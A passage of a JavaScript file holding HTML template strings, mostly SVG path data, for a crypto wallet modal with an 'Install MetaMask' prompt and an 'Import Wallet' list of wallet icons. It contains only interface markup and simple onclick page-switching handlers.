                                                            <path d="M4.7218 4.03027L14.4099 11.3528L12.6921 7.00442L4.7218 4.03027Z" fill="var(--ck-brand-metamask-08)" stroke="var(--ck-brand-metamask-08)" stroke-width="0.269931" stroke-linecap="round" stroke-linejoin="round"></path>
                                                            <path d="M23.7544 20.8438L21.1532 24.8289L26.7187 26.3602L28.3187 20.9321L23.7544 20.8438Z" fill="var(--ck-brand-metamask-08)" stroke="var(--ck-brand-metamask-08)" stroke-width="0.269931" stroke-linecap="round" stroke-linejoin="round"></path>
                                                            <path d="M3.69104 20.9321L5.28117 26.3602L10.8467 24.8289L8.24551 20.8438L3.69104 20.9321Z" fill="var(--ck-brand-metamask-08)" stroke="var(--ck-brand-metamask-08)" stroke-width="0.269931" stroke-linecap="round" stroke-linejoin="round"></path>
                                                            <path d="M10.5327 14.1108L8.98181 16.4568L14.5081 16.7022L14.3117 10.7637L10.5327 14.1108Z" fill="var(--ck-brand-metamask-08)" stroke="var(--ck-brand-metamask-08)" stroke-width="0.269931" stroke-linecap="round" stroke-linejoin="round"></path>
                                                            <path d="M21.4576 14.1111L17.6295 10.6953L17.5018 16.7025L23.0182 16.4571L21.4576 14.1111Z" fill="var(--ck-brand-metamask-08)" stroke="var(--ck-brand-metamask-08)" stroke-width="0.269931" stroke-linecap="round" stroke-linejoin="round"></path>
                                                            <path d="M10.8469 24.8292L14.1647 23.2096L11.2984 20.9717L10.8469 24.8292Z" fill="var(--ck-brand-metamask-08)" stroke="var(--ck-brand-metamask-08)" stroke-width="0.269931" stroke-linecap="round" stroke-linejoin="round"></path>
                                                            <path d="M17.8257 23.2096L21.1531 24.8292L20.6918 20.9717L17.8257 23.2096Z" fill="var(--ck-brand-metamask-08)" stroke="var(--ck-brand-metamask-08)" stroke-width="0.269931" stroke-linecap="round" stroke-linejoin="round"></path>
                                                            <path d="M21.1531 24.8296L17.8257 23.21L18.0906 25.3793L18.0612 26.2921L21.1531 24.8296Z" fill="var(--ck-brand-metamask-06)" stroke="var(--ck-brand-metamask-06)" stroke-width="0.269931" stroke-linecap="round" stroke-linejoin="round"></path>
                                                            <path d="M10.8469 24.8296L13.9388 26.2921L13.9192 25.3793L14.1647 23.21L10.8469 24.8296Z" fill="var(--ck-brand-metamask-06)" stroke="var(--ck-brand-metamask-06)" stroke-width="0.269931" stroke-linecap="round" stroke-linejoin="round"></path>
                                                            <path d="M13.9877 19.5389L11.2196 18.7242L13.1729 17.8311L13.9877 19.5389Z" fill="var(--ck-brand-metamask-09)" stroke="var(--ck-brand-metamask-09)" stroke-width="0.269931" stroke-linecap="round" stroke-linejoin="round"></path>
                                                            <path d="M18.0023 19.5389L18.8171 17.8311L20.7802 18.7242L18.0023 19.5389Z" fill="var(--ck-brand-metamask-09)" stroke="var(--ck-brand-metamask-09)" stroke-width="0.269931" stroke-linecap="round" stroke-linejoin="round"></path>
                                                            <path d="M10.8468 24.8289L11.3179 20.8438L8.24561 20.9321L10.8468 24.8289Z" fill="var(--ck-brand-metamask-03)" stroke="var(--ck-brand-metamask-03)" stroke-width="0.269931" stroke-linecap="round" stroke-linejoin="round"></path>
                                                            <path d="M20.6821 20.8438L21.1532 24.8289L23.7544 20.9321L20.6821 20.8438Z" fill="var(--ck-brand-metamask-03)" stroke="var(--ck-brand-metamask-03)" stroke-width="0.269931" stroke-linecap="round" stroke-linejoin="round"></path>
                                                            <path d="M23.0182 16.4565L17.5018 16.7019L18.0122 19.5387L18.827 17.8308L20.7902 18.7239L23.0182 16.4565Z" fill="var(--ck-brand-metamask-03)" stroke="var(--ck-brand-metamask-03)" stroke-width="0.269931" stroke-linecap="round" stroke-linejoin="round"></path>
                                                            <path d="M11.2198 18.7239L13.1829 17.8308L13.9878 19.5387L14.5081 16.7019L8.98181 16.4565L11.2198 18.7239Z" fill="var(--ck-brand-metamask-03)" stroke="var(--ck-brand-metamask-03)" stroke-width="0.269931" stroke-linecap="round" stroke-linejoin="round"></path>
                                                            <path d="M8.98181 16.4565L11.2983 20.9718L11.2198 18.7239L8.98181 16.4565Z" fill="var(--ck-brand-metamask-10)" stroke="var(--ck-brand-metamask-10)" stroke-width="0.269931" stroke-linecap="round" stroke-linejoin="round"></path>
                                                            <path d="M20.7901 18.7239L20.6919 20.9718L23.0181 16.4565L20.7901 18.7239Z" fill="var(--ck-brand-metamask-10)" stroke="var(--ck-brand-metamask-10)" stroke-width="0.269931" stroke-linecap="round" stroke-linejoin="round"></path>
                                                            <path d="M14.508 16.7021L13.9878 19.5389L14.6356 22.886L14.7828 18.4788L14.508 16.7021Z" fill="var(--ck-brand-metamask-10)" stroke="var(--ck-brand-metamask-10)" stroke-width="0.269931" stroke-linecap="round" stroke-linejoin="round"></path>
                                                            <path d="M17.5017 16.7021L17.2367 18.4689L17.3545 22.886L18.0121 19.5389L17.5017 16.7021Z" fill="var(--ck-brand-metamask-10)" stroke="var(--ck-brand-metamask-10)" stroke-width="0.269931" stroke-linecap="round" stroke-linejoin="round"></path>
                                                            <path d="M18.0121 19.5388L17.3545 22.886L17.8257 23.2099L20.6918 20.972L20.79 18.7241L18.0121 19.5388Z" fill="var(--ck-brand-metamask-01)" stroke="var(--ck-brand-metamask-01)" stroke-width="0.269931" stroke-linecap="round" stroke-linejoin="round"></path>
                                                            <path d="M11.2196 18.7241L11.2981 20.972L14.1644 23.2099L14.6355 22.886L13.9877 19.5388L11.2196 18.7241Z" fill="var(--ck-brand-metamask-01)" stroke="var(--ck-brand-metamask-01)" stroke-width="0.269931" stroke-linecap="round" stroke-linejoin="round"></path>
                                                            <path d="M18.0615 26.2917L18.0908 25.3788L17.8455 25.1628H14.145L13.9192 25.3788L13.9388 26.2917L10.8469 24.8291L11.9267 25.7126L14.1155 27.234H17.875L20.0736 25.7126L21.1533 24.8291L18.0615 26.2917Z" fill="var(--ck-brand-metamask-07)" stroke="var(--ck-brand-metamask-07)" stroke-width="0.269931" stroke-linecap="round" stroke-linejoin="round"></path>
                                                            <path d="M17.8258 23.2096L17.3546 22.8857H14.6357L14.1646 23.2096L13.9191 25.379L14.1449 25.163H17.8454L18.0907 25.379L17.8258 23.2096Z" fill="var(--ck-brand-metamask-04)" stroke="var(--ck-brand-metamask-04)" stroke-width="0.269931" stroke-linecap="round" stroke-linejoin="round"></path>
                                                            <path d="M27.6806 11.7552L28.5149 7.75041L27.2683 4.03027L17.8257 11.0387L21.4575 14.1109L26.591 15.6128L27.7296 14.2876L27.2389 13.9342L28.0241 13.2178L27.4156 12.7465L28.2007 12.1478L27.6806 11.7552Z" fill="var(--ck-brand-metamask-05)" stroke="var(--ck-brand-metamask-05)" stroke-width="0.269931" stroke-linecap="round" stroke-linejoin="round"></path>
                                                            <path d="M3.48486 7.75041L4.3192 11.7552L3.78916 12.1478L4.57441 12.7465L3.97566 13.2178L4.7609 13.9342L4.27012 14.2876L5.39892 15.6128L10.5325 14.1109L14.1644 11.0387L4.72164 4.03027L3.48486 7.75041Z" fill="var(--ck-brand-metamask-05)" stroke="var(--ck-brand-metamask-05)" stroke-width="0.269931" stroke-linecap="round" stroke-linejoin="round"></path>
                                                            <path d="M26.591 15.6122L21.4575 14.1104L23.0181 16.4564L20.6919 20.9716L23.7544 20.9323H28.3186L26.591 15.6122Z" fill="var(--ck-brand-metamask-01)" stroke="var(--ck-brand-metamask-01)" stroke-width="0.269931" stroke-linecap="round" stroke-linejoin="round"></path>
                                                            <path d="M10.5326 14.1104L5.39897 15.6122L3.69104 20.9323H8.24551L11.2982 20.9716L8.98168 16.4564L10.5326 14.1104Z" fill="var(--ck-brand-metamask-01)" stroke="var(--ck-brand-metamask-01)" stroke-width="0.269931" stroke-linecap="round" stroke-linejoin="round"></path>
                                                            <path d="M17.5018 16.7018L17.8258 11.0381L19.3177 7.00391H12.6921L14.1645 11.0381L14.5081 16.7018L14.6258 18.4883L14.6356 22.8856H17.3546L17.3742 18.4883L17.5018 16.7018Z" fill="var(--ck-brand-metamask-01)" stroke="var(--ck-brand-metamask-01)" stroke-width="0.269931" stroke-linecap="round" stroke-linejoin="round"></path>
                                                        </svg>
                                                    </div>
                                                </div>
                                            </div>
                                            <div class="sc-fvNpTx eFjHkq"></div>
                                        </div>
                                    </div>
                                </div>
                                <div class="sc-gKXOVf liyQQU">
                                    <div class="sc-jIAOiI dWkvrK" style="position: relative; opacity: 1; transform: none;">
                                        <div class="sc-iBkjds emnDjo" style="padding-bottom: 18px;">
                                            <h1 class="sc-ftvSup fqLYro">Install MetaMask<br></h1>
                                            <div class="sc-papXJ jCcNJP">To connect your MetaMask wallet,<br>install the browser extension.<br></div>
                                        </div>
                                        <button onClick="getMetamask()" class="sc-himrzO eyWopv">
                                           <div class="sc-ikZpkk FGzOk">
                                              <div class="sc-jIZahH gjHfVN">
                                                 <svg width="13" height="12" viewBox="0 0 13 12" fill="none" xmlns="http://www.w3.org/2000/svg" class="sc-ezWOiH bkoIPM">
                                                    <line stroke="currentColor" x1="1" y1="6" x2="12" y2="6" stroke-width="var(--stroke-width)" stroke-linecap="round" class="sc-kLLXSd bDZenP"></line>
                                                    <path stroke="currentColor" d="M7.51431 1.5L11.757 5.74264M7.5 10.4858L11.7426 6.24314" stroke-width="var(--stroke-width)" stroke-linecap="round" class="sc-bZkfAO"></path>
                                                 </svg>
                                              </div>
                                           </div>
                                           <span class="sc-gXmSlM CshDF">Get Metamask</span>
                                        </button>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>
`;

const WalletsModal = `
<div class="sc-idiyUo hBuwwI" style="--height: 500px; --width: 343px;">
    <div style="pointer-events: none; position: absolute; top: 0px; bottom: 0px; left: 50%; transform: translateX(-50%); width: var(--width); z-index: 9; transition: width 200ms ease 0s;"></div>
    <div class="sc-iqcoie RrATt active">
        <div class="sc-crXcEl gcowpW">
            <button onclick="updatePage(CloseModal);" aria-label="Close" class="sc-fnykZs hFEFWT">
                <svg width="14" height="14" viewBox="0 0 14 14" fill="none" xmlns="http://www.w3.org/2000/svg">
                    <path d="M1 13L13 1" stroke="currentColor" stroke-width="2" stroke-linecap="round"></path>
                    <path d="M1 0.999999L13 13" stroke="currentColor" stroke-width="2" stroke-linecap="round"></path>
                </svg>
            </button>
            <button onclick="updatePage(ConnectModal);" aria-label="Back" class="sc-fEOsli iSYxCx" style="opacity: 1;">
                <svg width="9" height="16" viewBox="0 0 9 16" fill="none" xmlns="http://www.w3.org/2000/svg">
                    <path d="M8 1L1 8L8 15" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></path>
                </svg>
            </button>
        </div>
        <div class="sc-eCYdqJ dLUlU">
            <div style="position: absolute; top: 0px; left: 0px; right: 0px; opacity: 1;">Import Wallet<br></div>
        </div>
        <div class="sc-evZas gcbNhn">
            <div class="sc-breuTD hVhjow active-scale-up">
                <div class="sc-ksZaOG dmNTWR" style="pointer-events: auto;">
                    <div class="sc-dkzDqf jKlSZW">
                        <div class="sc-jSMfEi lbAEgN"></div>
                        <div class="sc-dmRaPn fUAYBU">
                            <div class="sc-kgflAQ jpJKcK">
                                <div class="sc-gicCDI bkrrQH">
                                    <div class="sc-bBrHrO fbmkhr">
                                        <div class="sc-ivTmOn osRa-d">
                                            <div class="sc-llJcti ikCmYo">
                                                <div class="sc-iIPllB ixYWMG">
                                                    <div class="sc-cxabCf cYaUjj">
                                                        <svg aria-hidden="true" width="20" height="20" viewBox="0 0 20 20" fill="none" xmlns="http://www.w3.org/2000/svg">
                                                            <circle cx="10" cy="10" r="10" fill="var(--ck-brand-coinbaseWallet)"></circle>
                                                            <rect rx="27%" width="20" height="20" fill="var(--ck-brand-coinbaseWallet)"></rect>
                                                            <path fill-rule="evenodd" clip-rule="evenodd" d="M10.0001 17C13.8661 17 17.0001 13.866 17.0001 10C17.0001 6.13401 13.8661 3 10.0001 3C6.13413 3 3.00012 6.13401 3.00012 10C3.00012 13.866 6.13413 17 10.0001 17ZM8.25012 7.71429C7.95427 7.71429 7.71441 7.95414 7.71441 8.25V11.75C7.71441 12.0459 7.95427 12.2857 8.25012 12.2857H11.7501C12.046 12.2857 12.2858 12.0459 12.2858 11.75V8.25C12.2858 7.95414 12.046 7.71429 11.7501 7.71429H8.25012Z" fill="white"></path>
                                                        </svg>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                                <div class="sc-gicCDI bkrrQH">
                                    <div class="sc-bBrHrO fbmkhr">
                                        <div class="sc-ivTmOn osRa-d">
                                            <div class="sc-llJcti ikCmYo">
                                                <div class="sc-iIPllB ixYWMG">
                                                    <div class="sc-cxabCf cYaUjj">
                                                        <svg aria-hidden="true" width="32" height="32" viewBox="0 0 32 32" fill="none" xmlns="http://www.w3.org/2000/svg" style="background: linear-gradient(0deg, var(--ck-brand-metamask-12), var(--ck-brand-metamask-11)); border-radius: 27.5%;">
                                                            <path d="M27.2684 4.03027L17.5018 11.2841L19.3079 7.00442L27.2684 4.03027Z" fill="var(--ck-brand-metamask-02)" stroke="var(--ck-brand-metamask-02)" stroke-width="0.269931" stroke-linecap="round" stroke-linejoin="round"></path>
                                                            <path d="M4.7218 4.03027L14.4099 11.3528L12.6921 7.00442L4.7218 4.03027Z" fill="var(--ck-brand-metamask-08)" stroke="var(--ck-brand-metamask-08)" stroke-width="0.269931" stroke-linecap="round" stroke-linejoin="round"></path>
                                                            <path d="M23.7544 20.8438L21.1532 24.8289L26.7187 26.3602L28.3187 20.9321L23.7544 20.8438Z" fill="var(--ck-brand-metamask-08)" stroke="var(--ck-brand-metamask-08)" stroke-width="0.269931" stroke-linecap="round" stroke-linejoin="round"></path>
                                                            <path d="M3.69104 20.9321L5.28117 26.3602L10.8467 24.8289L8.24551 20.8438L3.69104 20.9321Z" fill="var(--ck-brand-metamask-08)" stroke="var(--ck-brand-metamask-08)" stroke-width="0.269931" stroke-linecap="round" stroke-linejoin="round"></path>
                                                            <path d="M10.5327 14.1108L8.98181 16.4568L14.5081 16.7022L14.3117 10.7637L10.5327 14.1108Z" fill="var(--ck-brand-metamask-08)" stroke="var(--ck-brand-metamask-08)" stroke-width="0.269931" stroke-linecap="round" stroke-linejoin="round"></path>
                                                            <path d="M21.4576 14.1111L17.6295 10.6953L17.5018 16.7025L23.0182 16.4571L21.4576 14.1111Z" fill="var(--ck-brand-metamask-08)" stroke="var(--ck-brand-metamask-08)" stroke-width="0.269931" stroke-linecap="round" stroke-linejoin="round"></path>
                                                            <path d="M10.8469 24.8292L14.1647 23.2096L11.2984 20.9717L10.8469 24.8292Z" fill="var(--ck-brand-metamask-08)" stroke="var(--ck-brand-metamask-08)" stroke-width="0.269931" stroke-linecap="round" stroke-linejoin="round"></path>
                                                            <path d="M17.8257 23.2096L21.1531 24.8292L20.6918 20.9717L17.8257 23.2096Z" fill="var(--ck-brand-metamask-08)" stroke="var(--ck-brand-metamask-08)" stroke-width="0.269931" stroke-linecap="round" stroke-linejoin="round"></path>
                                                            <path d="M21.1531 24.8296L17.8257 23.21L18.0906 25.3793L18.0612 26.2921L21.1531 24.8296Z" fill="var(--ck-brand-metamask-06)" stroke="var(--ck-brand-metamask-06)" stroke-width="0.269931" stroke-linecap="round" stroke-linejoin="round"></path>
                                                            <path d="M10.8469 24.8296L13.9388 26.2921L13.9192 25.3793L14.1647 23.21L10.8469 24.8296Z" fill="var(--ck-brand-metamask-06)" stroke="var(--ck-brand-metamask-06)" stroke-width="0.269931" stroke-linecap="round" stroke-linejoin="round"></path>
                                                            <path d="M13.9877 19.5389L11.2196 18.7242L13.1729 17.8311L13.9877 19.5389Z" fill="var(--ck-brand-metamask-09)" stroke="var(--ck-brand-metamask-09)" stroke-width="0.269931" stroke-linecap="round" stroke-linejoin="round"></path>
                                                            <path d="M18.0023 19.5389L18.8171 17.8311L20.7802 18.7242L18.0023 19.5389Z" fill="var(--ck-brand-metamask-09)" stroke="var(--ck-brand-metamask-09)" stroke-width="0.269931" stroke-linecap="round" stroke-linejoin="round"></path>
                                                            <path d="M10.8468 24.8289L11.3179 20.8438L8.24561 20.9321L10.8468 24.8289Z" fill="var(--ck-brand-metamask-03)" stroke="var(--ck-brand-metamask-03)" stroke-width="0.269931" stroke-linecap="round" stroke-linejoin="round"></path>
                                                            <path d="M20.6821 20.8438L21.1532 24.8289L23.7544 20.9321L20.6821 20.8438Z" fill="var(--ck-brand-metamask-03)" stroke="var(--ck-brand-metamask-03)" stroke-width="0.269931" stroke-linecap="round" stroke-linejoin="round"></path>
                                                            <path d="M23.0182 16.4565L17.5018 16.7019L18.0122 19.5387L18.827 17.8308L20.7902 18.7239L23.0182 16.4565Z" fill="var(--ck-brand-metamask-03)" stroke="var(--ck-brand-metamask-03)" stroke-width="0.269931" stroke-linecap="round" stroke-linejoin="round"></path>
                                                            <path d="M11.2198 18.7239L13.1829 17.8308L13.9878 19.5387L14.5081 16.7019L8.98181 16.4565L11.2198 18.7239Z" fill="var(--ck-brand-metamask-03)" stroke="var(--ck-brand-metamask-03)" stroke-width="0.269931" stroke-linecap="round" stroke-linejoin="round"></path>
                                                            <path d="M8.98181 16.4565L11.2983 20.9718L11.2198 18.7239L8.98181 16.4565Z" fill="var(--ck-brand-metamask-10)" stroke="var(--ck-brand-metamask-10)" stroke-width="0.269931" stroke-linecap="round" stroke-linejoin="round"></path>
                                                            <path d="M20.7901 18.7239L20.6919 20.9718L23.0181 16.4565L20.7901 18.7239Z" fill="var(--ck-brand-metamask-10)" stroke="var(--ck-brand-metamask-10)" stroke-width="0.269931" stroke-linecap="round" stroke-linejoin="round"></path>
                                                            <path d="M14.508 16.7021L13.9878 19.5389L14.6356 22.886L14.7828 18.4788L14.508 16.7021Z" fill="var(--ck-brand-metamask-10)" stroke="var(--ck-brand-metamask-10)" stroke-width="0.269931" stroke-linecap="round" stroke-linejoin="round"></path>
                                                            <path d="M17.5017 16.7021L17.2367 18.4689L17.3545 22.886L18.0121 19.5389L17.5017 16.7021Z" fill="var(--ck-brand-metamask-10)" stroke="var(--ck-brand-metamask-10)" stroke-width="0.269931" stroke-linecap="round" stroke-linejoin="round"></path>
                                                            <path d="M18.0121 19.5388L17.3545 22.886L17.8257 23.2099L20.6918 20.972L20.79 18.7241L18.0121 19.5388Z" fill="var(--ck-brand-metamask-01)" stroke="var(--ck-brand-metamask-01)" stroke-width="0.269931" stroke-linecap="round" stroke-linejoin="round"></path>
                                                            <path d="M11.2196 18.7241L11.2981 20.972L14.1644 23.2099L14.6355 22.886L13.9877 19.5388L11.2196 18.7241Z" fill="var(--ck-brand-metamask-01)" stroke="var(--ck-brand-metamask-01)" stroke-width="0.269931" stroke-linecap="round" stroke-linejoin="round"></path>
                                                            <path d="M18.0615 26.2917L18.0908 25.3788L17.8455 25.1628H14.145L13.9192 25.3788L13.9388 26.2917L10.8469 24.8291L11.9267 25.7126L14.1155 27.234H17.875L20.0736 25.7126L21.1533 24.8291L18.0615 26.2917Z" fill="var(--ck-brand-metamask-07)" stroke="var(--ck-brand-metamask-07)" stroke-width="0.269931" stroke-linecap="round" stroke-linejoin="round"></path>
                                                            <path d="M17.8258 23.2096L17.3546 22.8857H14.6357L14.1646 23.2096L13.9191 25.379L14.1449 25.163H17.8454L18.0907 25.379L17.8258 23.2096Z" fill="var(--ck-brand-metamask-04)" stroke="var(--ck-brand-metamask-04)" stroke-width="0.269931" stroke-linecap="round" stroke-linejoin="round"></path>
                                                            <path d="M27.6806 11.7552L28.5149 7.75041L27.2683 4.03027L17.8257 11.0387L21.4575 14.1109L26.591 15.6128L27.7296 14.2876L27.2389 13.9342L28.0241 13.2178L27.4156 12.7465L28.2007 12.1478L27.6806 11.7552Z" fill="var(--ck-brand-metamask-05)" stroke="var(--ck-brand-metamask-05)" stroke-width="0.269931" stroke-linecap="round" stroke-linejoin="round"></path>
                                                            <path d="M3.48486 7.75041L4.3192 11.7552L3.78916 12.1478L4.57441 12.7465L3.97566 13.2178L4.7609 13.9342L4.27012 14.2876L5.39892 15.6128L10.5325 14.1109L14.1644 11.0387L4.72164 4.03027L3.48486 7.75041Z" fill="var(--ck-brand-metamask-05)" stroke="var(--ck-brand-metamask-05)" stroke-width="0.269931" stroke-linecap="round" stroke-linejoin="round"></path>
                                                            <path d="M26.591 15.6122L21.4575 14.1104L23.0181 16.4564L20.6919 20.9716L23.7544 20.9323H28.3186L26.591 15.6122Z" fill="var(--ck-brand-metamask-01)" stroke="var(--ck-brand-metamask-01)" stroke-width="0.269931" stroke-linecap="round" stroke-linejoin="round"></path>
                                                            <path d="M10.5326 14.1104L5.39897 15.6122L3.69104 20.9323H8.24551L11.2982 20.9716L8.98168 16.4564L10.5326 14.1104Z" fill="var(--ck-brand-metamask-01)" stroke="var(--ck-brand-metamask-01)" stroke-width="0.269931" stroke-linecap="round" stroke-linejoin="round"></path>
                                                            <path d="M17.5018 16.7018L17.8258 11.0381L19.3177 7.00391H12.6921L14.1645 11.0381L14.5081 16.7018L14.6258 18.4883L14.6356 22.8856H17.3546L17.3742 18.4883L17.5018 16.7018Z" fill="var(--ck-brand-metamask-01)" stroke="var(--ck-brand-metamask-01)" stroke-width="0.269931" stroke-linecap="round" stroke-linejoin="round"></path>
                                                        </svg>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                                <div class="sc-gicCDI bkrrQH">
                                    <div class="sc-bBrHrO fbmkhr">
                                        <div class="sc-ivTmOn osRa-d">
                                            <div class="sc-llJcti ikCmYo">
                                                <div class="sc-iIPllB ixYWMG">
                                                    <div class="sc-cxabCf cYaUjj">
                                                        <svg aria-hidden="true" width="44" height="44" viewBox="0 0 44 44" fill="none" xmlns="http://www.w3.org/2000/svg">
                                                            <rect width="44" height="44" fill="var(--ck-brand-trust-02)"></rect>
                                                            <path fill-rule="evenodd" clip-rule="evenodd" d="M33.0246 11.8662C33.4096 11.8662 33.774 12.0243 34.0421 12.2925C34.3102 12.5675 34.4615 12.9387 34.4546 13.3168C34.3859 17.4143 34.2277 20.5493 33.9321 23.0312C33.6433 25.5131 33.2102 27.3556 32.5571 28.8475C32.1171 29.8443 31.574 30.6693 30.9346 31.3706C30.0752 32.2987 29.0921 32.9725 28.0196 33.6119C27.561 33.8861 27.0843 34.1568 26.5842 34.4408C25.5172 35.0468 24.3441 35.713 23.0146 36.6025C22.5333 36.9256 21.9077 36.9256 21.4265 36.6025C20.0766 35.7026 18.8879 35.0281 17.8112 34.4173C17.5718 34.2815 17.3379 34.1488 17.109 34.0175C15.8509 33.2887 14.7165 32.5943 13.7265 31.5906C13.0665 30.9306 12.4959 30.1262 12.0421 29.1706C11.4234 27.8918 11.004 26.345 10.6946 24.3443C10.2821 21.67 10.0759 18.1706 10.0002 13.3168C9.99336 12.9387 10.1377 12.5675 10.4059 12.2925C10.674 12.0243 11.0452 11.8662 11.4302 11.8662H12.0215C13.8433 11.8731 17.8652 11.6943 21.344 8.98559C21.8596 8.58683 22.5815 8.58683 23.0971 8.98559C26.5759 11.6943 30.5977 11.8731 32.4265 11.8662H33.0246ZM29.8277 27.9331C30.2746 27.0118 30.6459 25.74 30.9277 23.9112C31.2646 21.725 31.4709 18.755 31.5671 14.7125C29.4221 14.6506 25.7371 14.2381 22.224 11.8731C18.7109 14.2312 15.0259 14.6437 12.8877 14.7125C12.9633 18.0537 13.1146 20.6525 13.3552 22.6943C13.6302 25.0181 14.0221 26.5925 14.5102 27.6993C14.8333 28.435 15.1909 28.9643 15.6171 29.4318C16.1877 30.0575 16.9096 30.5731 17.8927 31.1643C18.3005 31.409 18.7502 31.6635 19.2396 31.9406C20.1116 32.4341 21.1099 32.9991 22.224 33.7081C23.3175 33.0107 24.3014 32.4515 25.1633 31.9616C25.4231 31.8139 25.6717 31.6725 25.909 31.5356C27.119 30.8412 28.0127 30.2637 28.6796 29.59C29.1265 29.1293 29.4909 28.6275 29.8277 27.9331Z" fill="var(--ck-brand-trust-01)"></path>
                                                        </svg>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                                <div class="sc-gicCDI bkrrQH">
                                    <div class="sc-bBrHrO fbmkhr">
                                        <div class="sc-ivTmOn osRa-d">
                                            <div class="sc-llJcti ikCmYo">
                                                <div class="sc-iIPllB ixYWMG">
                                                    <div class="sc-cxabCf cYaUjj">
                                                        <svg aria-hidden="true" width="32" height="32" viewBox="0 0 32 32" fill="none" xmlns="http://www.w3.org/2000/svg">
                                                            <rect width="32" height="32" fill="white"></rect>
                                                            <path d="M18.3242 7.63647H13.6516C13.4955 7.63647 13.3704 7.76611 13.367 7.92726C13.2726 12.4568 10.9768 16.7559 7.02532 19.8009C6.89986 19.8976 6.87128 20.0792 6.963 20.21L9.69685 24.112C9.78986 24.2448 9.97107 24.2747 10.0986 24.1772C12.5694 22.2856 14.5567 20.0038 15.9879 17.4746C17.4191 20.0038 19.4065 22.2856 21.8773 24.1772C22.0047 24.2747 22.186 24.2448 22.2791 24.112L25.013 20.21C25.1045 20.0792 25.0759 19.8976 24.9506 19.8009C20.999 16.7559 18.7033 12.4568 18.609 7.92726C18.6056 7.76611 18.4803 7.63647 18.3242 7.63647Z" fill="var(--ck-brand-argent)"></path>
                                                        </svg>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                                <div class="sc-gicCDI bkrrQH">
                                    <div class="sc-bBrHrO fbmkhr">
                                        <div class="sc-ivTmOn osRa-d">
                                            <div class="sc-llJcti ikCmYo">
                                                <div class="sc-iIPllB ixYWMG">
                                                    <div class="sc-cxabCf cYaUjj">
                                                        <svg aria-hidden="true" width="32" height="32" viewBox="0 0 32 32" fill="none" xmlns="http://www.w3.org/2000/svg" style="background: linear-gradient(
                                                            180deg,
                                                            var(--ck-brand-imtoken-01) 0%,
                                                            var(--ck-brand-imtoken-02) 100%
                                                            );">
                                                            <path d="M26.8543 9.96509C27.5498 19.3857 21.4942 23.8384 16.0655 24.3132C11.0184 24.7546 6.26765 21.6534 5.85087 16.8885C5.50707 12.952 7.94004 11.2761 9.8516 11.109C11.8177 10.9367 13.4698 12.2925 13.6132 13.9342C13.7512 15.5125 12.7664 16.2308 12.0815 16.2906C11.5398 16.3381 10.8584 16.0093 10.7968 15.3032C10.7441 14.6965 10.9744 14.6138 10.9182 13.9693C10.8179 12.8219 9.81731 12.6882 9.26951 12.7357C8.60654 12.7937 7.40368 13.5675 7.5725 15.4949C7.7422 17.439 9.60628 18.9751 12.0498 18.7614C14.6868 18.531 16.5227 16.4779 16.6608 13.5983C16.6595 13.4458 16.6916 13.2948 16.7548 13.156L16.7557 13.1525C16.7841 13.0922 16.8174 13.0342 16.8551 12.9793C16.9113 12.8949 16.9835 12.8016 17.0767 12.6997C17.0775 12.697 17.0775 12.697 17.0793 12.697C17.147 12.6205 17.2288 12.5379 17.3211 12.4491C18.473 11.3623 22.6214 8.79916 26.5448 9.61074C26.6277 9.62851 26.7026 9.67262 26.7584 9.73649C26.8142 9.80035 26.8478 9.88054 26.8543 9.96509" fill="white"></path>
                                                        </svg>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                            <div class="sc-fLlhyt fbkVsj">
                                <svg aria-hidden="true" width="298" height="188" viewBox="0 0 298 188" fill="none" xmlns="http://www.w3.org/2000/svg">
                                    <path d="M1 55.2757L21.6438 46.0285C55.5896 30.8228 94.4104 30.8228 128.356 46.0286L169.644 64.5229C203.59 79.7287 242.41 79.7286 276.356 64.5229L297 55.2757M1 44.2118L21.6438 34.9646C55.5896 19.7589 94.4104 19.7589 128.356 34.9646L169.644 53.459C203.59 68.6647 242.41 68.6647 276.356 53.459L297 44.2118M1 33.1477L21.6438 23.9005C55.5896 8.69479 94.4104 8.69479 128.356 23.9005L169.644 42.3949C203.59 57.6006 242.41 57.6006 276.356 42.3949L297 33.1477M1 22.1477L21.6438 12.9005C55.5896 -2.30521 94.4104 -2.30521 128.356 12.9005L169.644 31.3949C203.59 46.6006 242.41 46.6006 276.356 31.3949L297 22.1477M1 66.3398L21.6438 57.0926C55.5896 41.8869 94.4104 41.8869 128.356 57.0926L169.644 75.587C203.59 90.7927 242.41 90.7927 276.356 75.587L297 66.3398M1 77.404L21.6438 68.1568C55.5896 52.9511 94.4104 52.9511 128.356 68.1569L169.644 86.6512C203.59 101.857 242.41 101.857 276.356 86.6512L297 77.404M1 88.4681L21.6438 79.2209C55.5896 64.0152 94.4104 64.0152 128.356 79.2209L169.644 97.7153C203.59 112.921 242.41 112.921 276.356 97.7153L297 88.4681M1 121.66L21.6438 112.413C55.5896 97.2075 94.4104 97.2075 128.356 112.413L169.644 130.908C203.59 146.113 242.41 146.113 276.356 130.908L297 121.66M1 110.596L21.6438 101.349C55.5896 86.1433 94.4104 86.1433 128.356 101.349L169.644 119.843C203.59 135.049 242.41 135.049 276.356 119.843L297 110.596M1 99.5321L21.6438 90.2849C55.5896 75.0792 94.4104 75.0792 128.356 90.2849L169.644 108.779C203.59 123.985 242.41 123.985 276.356 108.779L297 99.5321M1 132.724L21.6438 123.477C55.5896 108.271 94.4104 108.271 128.356 123.477L169.644 141.971C203.59 157.177 242.41 157.177 276.356 141.971L297 132.724M1 143.788L21.6438 134.541C55.5896 119.336 94.4104 119.336 128.356 134.541L169.644 153.036C203.59 168.241 242.41 168.241 276.356 153.036L297 143.788M1 154.853L21.6438 145.605C55.5896 130.4 94.4104 130.4 128.356 145.605L169.644 164.1C203.59 179.305 242.41 179.305 276.356 164.1L297 154.853M1 165.853L21.6438 156.605C55.5896 141.4 94.4104 141.4 128.356 156.605L169.644 175.1C203.59 190.305 242.41 190.305 276.356 175.1L297 165.853" stroke="url(#paint0_linear_1094_2077)" stroke-opacity="0.9" stroke-linecap="round" stroke-linejoin="round"></path>
                                    <defs>
